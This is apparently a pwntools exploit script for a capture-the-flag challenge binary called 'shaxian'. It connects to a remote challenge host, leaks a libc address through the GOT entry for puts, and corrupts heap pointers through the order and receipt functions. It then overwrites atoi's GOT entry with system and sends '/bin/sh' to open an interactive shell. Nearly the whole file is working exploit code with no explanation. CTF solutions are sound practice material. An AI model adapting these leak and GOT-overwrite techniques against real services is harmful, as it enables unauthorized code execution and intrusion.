#!/usr/bin/env python
# coding:utf-8

from utils import *

elf = ELF('shaxian_51f320b11793463ecdcfbb0c015cc273')
taitou_address = 0x0804B300
gptr_address = 0x0804B1C0

context.log_level = 'error'

io = remote('180.76.178.48', 23333)
# io = remote('0.0.0.0', 4000)
# io = process('./shaxian_51f320b11793463ecdcfbb0c015cc273')
# io = debug('./shaxian_51f320b11793463ecdcfbb0c015cc273');  io.r()

def add_order(name, count=1):
    global io
    io.sendline(1)
    io.sendline(name)
    io.sendline(count)

def submit():
    global io
    io.sendline(2)

def review():
    global io
    io.sendline(4)

def receipt(taitou):
    global io
    io.sendline(3)
    io.sendline(taitou)

def leak(address):
    global io
    add_order(cyclic(0x20) + p32(address))
    review()
    io.recvline_endswith(' * 1')
    name = io.recvuntil(' * ', True)
    count = io.recvline(True)
    return p32(int(count), signed=True) + name + '\x00'

io.sendline('A')
io.sendline(cyclic(0xf0) + p32(0x30) + p32(0x30))

# libc = DynELF(leak, elf.entry, elf=elf)
# system_addr = libc.lookup('system', 'libc')

puts_addr = u32(leak(elf.got['puts'])[:4])
log.info('puts address: 0x%08x' % puts_addr)

system_addr = puts_addr - 157696
# system_addr = 0xf7e46360
log.info('system address: 0x%08x' % system_addr)

add_order(cyclic(0x20) + p32(taitou_address + 8))
payload = p32(0x30) + p32(0x31) + cyclic(0x24) + p32(0)
payload *= 3
receipt(payload)
submit()

payload = p32(0x30) + p32(0x30) + p32(gptr_address - 0x10) + cyclic(0x24)
receipt(payload)

add_order(cyclic(0x20) + p32(gptr_address - 0x10))

payload = cyclic(4)
payload += p32(elf.got['atoi'])
add_order(payload, u32(p32(system_addr), signed=True))

io.sendline('/bin/sh')

io.ext_interactive()
